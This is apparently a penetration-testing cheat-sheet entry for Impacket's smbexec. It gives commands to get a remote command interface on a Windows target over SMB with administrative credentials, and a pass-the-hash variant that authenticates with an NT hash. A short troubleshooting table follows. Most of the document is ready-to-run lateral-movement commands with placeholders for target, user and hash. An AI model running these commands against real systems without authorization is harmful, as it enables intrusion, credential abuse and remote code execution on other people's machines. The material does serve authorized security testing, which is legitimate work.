## Verify service-control execution and its output

**Run in:** Kali. **Requires:** Administrative service-control rights, SMB connectivity and an available output share; enter whoami in the returned command interface.

```bash
impacket-smbexec 'DOMAIN/USER@TARGET_IP'
```

**What the result establishes:** Identify the remote execution identity and whether output is being retrieved from the expected share.

**Next check:** Verify service creation rights and output transport; share readability alone does not establish execution permission.

## NT hash

**Kali**

```bash
impacket-smbexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP'
```

## If it fails

| Symptom | Check |
| --- | --- |
| A share is readable but the remote command interface fails | This method uses service-control operations; share access alone does not establish the required rights. |
